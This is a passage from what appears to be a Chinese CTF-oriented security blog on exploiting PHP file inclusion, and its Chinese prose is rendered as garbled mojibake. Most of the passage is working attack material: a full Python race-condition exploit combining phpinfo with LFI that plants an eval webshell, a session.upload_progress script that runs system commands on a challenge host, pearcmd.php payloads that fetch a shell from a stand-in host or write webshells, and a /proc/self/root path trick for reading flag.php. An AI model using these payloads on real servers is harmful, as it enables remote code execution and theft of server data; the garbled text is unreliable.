<p>åŒæ—¶ï¼Œå› ä¸º<code>phpinfo</code>é¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘<code>phpinfo</code>é¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°<code>$_FILES</code>å˜é‡çš„å†…å®¹ï¼Œè‡ªç„¶ä¹ŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åã€‚</p>
<p><img src="/img/summary/file_include-10.png"></p>
<p>åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰¾ä¸åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶æ—¶ï¼Œå³å¯åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œç„¶ååŒ…å«ä¹‹ã€‚</p>
<p>ä½†æ–‡ä»¶åŒ…å«æ¼æ´å’Œ<code>phpinfo</code>é¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™<code>phpinfo</code>é¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œ<code>getshell</code>ã€‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±è¢«åˆ é™¤äº†ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è‡ªç„¶ä¹Ÿå°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<p>1ï¼šå‘é€åŒ…å«äº†<code>webshell</code>çš„ä¸Šä¼ æ•°æ®åŒ…ç»™<code>phpinfo</code>é¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„<code>header</code>ã€<code>get</code>ç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ®<br>2ï¼šå› ä¸º<code>phpinfo</code>é¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ª<code>phpinfo</code>é¡µé¢æ’‘å¾—éå¸¸å¤§<br>3ï¼š<code>php</code>é»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º<code>4096</code>ï¼Œå¯ä»¥ç†è§£ä¸º<code>php</code>æ¯æ¬¡è¿”å›<code>4096</code>ä¸ªå­—èŠ‚ç»™<code>socket</code>è¿æ¥<br>4ï¼šæ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿ<code>socket</code>ï¼Œæ¯æ¬¡è¯»å–<code>4096</code>ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…<br>5ï¼šæ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„<code>socket</code>è¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸º<code>php</code>è¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º<code>4096</code>ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤<br>6ï¼šåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆ<code>getshell</code></p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># python2 exp.py your-ip 8080 100</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">host, port</span>):<br>    TAG=<span class="hljs-string">&quot;Security Test&quot;</span><br>    PAYLOAD=<span class="hljs-string">&quot;&quot;&quot;%s\r</span><br><span class="hljs-string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG<br>    REQ1_DATA=<span class="hljs-string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="hljs-string">Content-Type: text/plain\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s</span><br><span class="hljs-string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD<br>    padding=<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">5000</span><br>    REQ1=<span class="hljs-string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="hljs-string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Length: %s\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s&quot;&quot;&quot;</span> %(<span class="hljs-built_in">len</span>(REQ1_DATA),host,REQ1_DATA)<br>    <span class="hljs-comment">#modify this to suit the LFI script</span><br>    LFIREQ=<span class="hljs-string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="hljs-string">User-Agent: Mozilla/4.0\r</span><br><span class="hljs-string">Proxy-Connection: Keep-Alive\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> (REQ1, TAG, LFIREQ)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phpInfoLFI</span>(<span class="hljs-params">host, port, phpinforeq, offset, lfireq, tag</span>):<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br>    s.connect((host, port))<br>    s2.connect((host, port))<br><br>    s.send(phpinforeq)<br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d) &lt; offset:<br>        d += s.recv(offset)<br>    <span class="hljs-keyword">try</span>:<br>        i = d.index(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>        fn = d[i+<span class="hljs-number">17</span>:i+<span class="hljs-number">31</span>]<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    s2.send(lfireq % (fn, host))<br>    d = s2.recv(<span class="hljs-number">4096</span>)<br>    s.close()<br>    s2.close()<br><br>    <span class="hljs-keyword">if</span> d.find(tag) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> fn<br><br>counter=<span class="hljs-number">0</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWorker</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, e, l, m, *args</span>):<br>        threading.Thread.__init__(self)<br>        self.event = e<br>        self.lock =  l<br>        self.maxattempts = m<br>        self.args = args<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> counter<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.event.is_set():<br>            <span class="hljs-keyword">with</span> self.lock:<br>                <span class="hljs-keyword">if</span> counter &gt;= self.maxattempts:<br>                    <span class="hljs-keyword">return</span><br>                counter+=<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">try</span>:<br>                x = phpInfoLFI(*self.args)<br>                <span class="hljs-keyword">if</span> self.event.is_set():<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> x:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nGot it! Shell created in /tmp/g&quot;</span><br>                    self.event.<span class="hljs-built_in">set</span>()<br><br>            <span class="hljs-keyword">except</span> socket.error:<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOffset</span>(<span class="hljs-params">host, port, phpinforeq</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host,port))<br>    s.send(phpinforeq)<br><br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = s.recv(<span class="hljs-number">4096</span>)<br>        d+=i<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># detect the final chunk</span><br>        <span class="hljs-keyword">if</span> i.endswith(<span class="hljs-string">&quot;0\r\n\r\n&quot;</span>):<br>            <span class="hljs-keyword">break</span><br>    s.close()<br>    i = d.find(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> i == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No php tmp_name in phpinfo output&quot;</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="hljs-number">10</span>],i)<br>    <span class="hljs-comment"># padded up a bit</span><br>    <span class="hljs-keyword">return</span> i+<span class="hljs-number">256</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LFI With PHPInfo()&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;-=&quot;</span> * <span class="hljs-number">30</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="hljs-number">0</span>]<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        host = socket.gethostbyname(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span> socket.error, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="hljs-number">1</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    port=<span class="hljs-number">80</span><br>    <span class="hljs-keyword">try</span>:<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">2</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    poolsz=<span class="hljs-number">10</span><br>    <span class="hljs-keyword">try</span>:<br>        poolsz = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">3</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Getting initial offset...&quot;</span>,<br>    reqphp, tag, reqlfi = setup(host, port)<br>    offset = getOffset(host, port, reqphp)<br>    sys.stdout.flush()<br><br>    maxattempts = <span class="hljs-number">1000</span><br>    e = threading.Event()<br>    l = threading.Lock()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz<br>    sys.stdout.flush()<br><br>    tp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,poolsz):<br>        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.start()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.wait(<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> e.is_set():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> l:<br>                sys.stdout.write( <span class="hljs-string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))<br>                sys.stdout.flush()<br>                <span class="hljs-keyword">if</span> counter &gt;= maxattempts:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">if</span> e.is_set():<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Woot!  \m/&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;:(&quot;</span><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nTelling threads to shutdown...&quot;</span><br>        e.<span class="hljs-built_in">set</span>()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Shuttin&#x27; down...&quot;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>


<h2 id="session-upload-progressæ–‡ä»¶åŒ…å«"><a href="#session-upload-progressæ–‡ä»¶åŒ…å«" class="headerlink" title="session.upload_progressæ–‡ä»¶åŒ…å«"></a>session.upload_progressæ–‡ä»¶åŒ…å«</h2><p>ä¼šè¯æœºåˆ¶(session)åœ¨PHPä¸­ç”¨äºä¿æŒç”¨æˆ·è¿ç»­è®¿é—®Webåº”ç”¨æ—¶çš„ç›¸å…³æ•°æ®ã€‚</p>
<p><code>PHP</code>å°†<code>session</code>ä»¥æ–‡ä»¶çš„å½¢å¼å­˜å‚¨åœ¨æœåŠ¡å™¨æŸä¸ªæ–‡ä»¶ä¸­ï¼Œå¯ä»¥åœ¨<code>php.ini</code>é‡Œé¢è®¾ç½®<code>session</code>çš„å­˜å‚¨ä½ç½®<code>session.save_path</code></p>
<p>é»˜è®¤è·¯å¾„</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/var/lib/php/sess_PHPSESSID<br>/var/lib/php/sessions/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br></code></pre></td></tr></table></figure>


<p>å†çœ‹ä¸‹åœ¨<code>php.ini</code>ä¸­å…³äº<code>session</code>å’Œ<code>upload_progress</code>çš„å‡ ä¸ªé»˜è®¤é…ç½®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">session.upload_progress.enabled = on<br>session.upload_progress.cleanup = on<br>session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>session.upload_progress.freq = <span class="hljs-string">&quot;1%&quot;</span><br>session.upload_progress.min_freq = <span class="hljs-string">&quot;1&quot;</span><br>session.use_strict_mode = <span class="hljs-string">&quot;0&quot;</span><br></code></pre></td></tr></table></figure>


<blockquote>
<p>enabled&#x3D;onè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ï¼›<br>cleanup&#x3D;onè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼›<br>nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›<br>prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å;</p>
</blockquote>
<p>å…¶ä¸­<code>session.use_strict_mode</code>é»˜è®¤å€¼ä¸º<code>0</code>ï¼Œæ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰<code>Session ID</code>çš„ï¼Œæ¯”å¦‚åœ¨<code>Cookie</code>é‡Œè®¾ç½®<code>PHPSESSID=lewiserii</code>ï¼Œ<code>PHP</code>å°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_lewiserii</code></p>
<p>ç„¶ååœ¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>ä¸‹æ·»åŠ ä¸€å¥è¯æœ¨é©¬ï¼Œè¿™æ ·å°±ä¼šå¾€æŒ‡å®šçš„<code>session</code>æ–‡ä»¶ä¸­å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å†…å®¹</p>
<p><img src="/img/summary/file_include-11.png"></p>
<p>ç„¶å<code>?file=/tmp/sess_lewiserii</code>åŒ…å«å³å¯</p>
<p>ä½†æ˜¯è¦æ³¨æ„<code>session.upload_progress.cleanup</code>é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œå®ƒå°±ä¼šæ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥åŒ…å«</p>
<p>ä½¿ç”¨bpåŒæ—¶ä¸æ–­çš„å‘postä¼ æ–‡ä»¶çš„åŒ…å’Œæ–‡ä»¶åŒ…å«çš„åŒ…æˆ–è€…ä½¿ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessid = <span class="hljs-string">&#x27;ctf&#x27;</span><br>sess_path=<span class="hljs-string">&#x27;/tmp&#x27;</span><br>url=<span class="hljs-string">&#x27;http://c0648e39-a4bb-4776-88f0-a5cf98e9f640.challenge.ctf.show/&#x27;</span><br>cmd=<span class="hljs-string">&#x27;ls /&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">WRITE</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;x&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            url=url,<br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="hljs-string">f&quot;&lt;?php system(&#x27;<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;);?&gt;&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;xxx.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        response = session.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>?file=<span class="hljs-subst">&#123;sess_path&#125;</span>/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;upload_progress_&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;++++++retry++++++&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = threading.Thread(target=WRITE, args=(session,))<br>        t1.daemon = <span class="hljs-literal">True</span><br>        t1.start()<br>        READ(session)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>



<h2 id="pearæ–‡ä»¶åŒ…å«"><a href="#pearæ–‡ä»¶åŒ…å«" class="headerlink" title="pearæ–‡ä»¶åŒ…å«"></a>pearæ–‡ä»¶åŒ…å«</h2><p>åˆ©ç”¨æ¡ä»¶<br>1ï¼šæœ‰æ–‡ä»¶åŒ…å«ç‚¹<br>2ï¼šå¼€å¯äº†<code>pear</code>æ‰©å±•<br>3ï¼šé…ç½®æ–‡ä»¶ä¸­<code>register_argc_argv</code>è®¾ç½®ä¸º<code>On</code>ï¼Œè€Œé»˜è®¤ä¸º<code>Off</code></p>
<blockquote>
<p>PEARæ˜¯ä¸ºPHPæ‰©å±•ä¸åº”ç”¨åº“(PHP Extension and Application Repository)ï¼Œå®ƒæ˜¯ä¸€ä¸ªPHPæ‰©å±•åŠåº”ç”¨çš„ä¸€ä¸ªä»£ç ä»“åº“ï¼Œç±»ä¼¼äºcomposerï¼Œç”¨äºä»£ç çš„ä¸‹è½½ä¸ç®¡ç†ã€‚é»˜è®¤å®‰è£…ä½ç½®ï¼š<code>/usr/local/lib/php</code></p>
</blockquote>
<p>é‚£ä¹ˆè¿™ä¸ª<code>register_argc_argv</code>èƒ½å¹²ä»€ä¹ˆå‘¢ï¼Ÿç®€è¨€ä¹‹ï¼Œå¯ä»¥é€šè¿‡<code>$_SERVER[&#39;argv&#39;]</code>è·å¾—å‘½ä»¤è¡Œå‚æ•°ï¼Œå…¶ä¸­ä»¥<code>+</code>ä½œä¸ºåˆ†éš”ç¬¦</p>
<p><img src="/img/summary/file_include-12.png"></p>
<p>åœ¨<code>pear</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>pearcmd.php</code>ï¼Œæ˜¯<code>pear</code>å‘½ä»¤è°ƒç”¨çš„æ–‡ä»¶ï¼Œæ˜¯ç”¨æ¥ç®¡ç†ä¾èµ–çš„ï¼Œç±»ä¼¼pythonçš„pipã€‚èƒ½åŒ…å«å®ƒåˆèƒ½ç»™å‚æ•°çš„è¯ï¼Œå°±å¯ä»¥ç”¨å®ƒæ¥å†™æœ¨é©¬äº†</p>
<h3 id="é¶æœºå¯å‡ºç½‘"><a href="#é¶æœºå¯å‡ºç½‘" class="headerlink" title="é¶æœºå¯å‡ºç½‘"></a>é¶æœºå¯å‡ºç½‘</h3><p>è¿œç¨‹æ–‡ä»¶ä¸‹è½½</p>
<p>å‘½ä»¤è¡Œè¯­æ³•ï¼š<code>pear install -R /tmp http://vps/shell.php</code></p>
<p>ç”¨<code>install</code>ä¼šä¸‹è½½åˆ°<code>/tmp/pear</code>ç›®å½•ä¸‹ï¼Œç”¨<code>download</code>ä¼šä¸‹è½½åˆ°å½“å‰ç›®å½•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨<code>-R</code>æŒ‡å®šç›®å½•</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/?file=/usr/local/lib/php/pearcmd.php&amp;+install+http://your-shell.com/shell.php<br>/?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/var/www/html/+http://your-shell.com/shell.php<br>/?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://your-shell.com/shell.php<br></code></pre></td></tr></table></figure>

<h3 id="é¶æœºä¸å‡ºç½‘"><a href="#é¶æœºä¸å‡ºç½‘" class="headerlink" title="é¶æœºä¸å‡ºç½‘"></a>é¶æœºä¸å‡ºç½‘</h3><p>å†™shell</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=eval($_POST[a])?&gt;+/tmp/shell.php<br>/?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[a]`;?&gt;+1.php<br></code></pre></td></tr></table></figure>


<p>ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œé…ç½®é¡¹ä¼ å…¥æˆ‘ä»¬æ¶æ„çš„phpä»£ç </p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">/?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/ctf.php+-d+man_dir=&lt;?eval($_POST[1]);?&gt;+-s+<br></code></pre></td></tr></table></figure>


<h2 id="ç»•è¿‡åŒ…å«æ¬¡æ•°é™åˆ¶"><a href="#ç»•è¿‡åŒ…å«æ¬¡æ•°é™åˆ¶" class="headerlink" title="ç»•è¿‡åŒ…å«æ¬¡æ•°é™åˆ¶"></a>ç»•è¿‡åŒ…å«æ¬¡æ•°é™åˆ¶</h2><p>ä¾‹é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å› ä¸º<code>include_once</code>ï¼Œ<code>require_once</code>å¯¹äºåŒä¸€ä¸ªæ–‡ä»¶åªèƒ½åŒ…å«ä¸€æ¬¡ï¼Œå·²ç»åŒ…å«äº†<code>flag.php</code>ä¸€æ¬¡äº†ï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•ç»§ç»­åŒ…å«å®ƒäº†å—ï¼Ÿ</p>
<p>payload:<br><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
<p>è·¯å¾„ä¸­çš„<code>/proc/self/root</code>å°±è¡¨ç¤º<code>/</code></p>
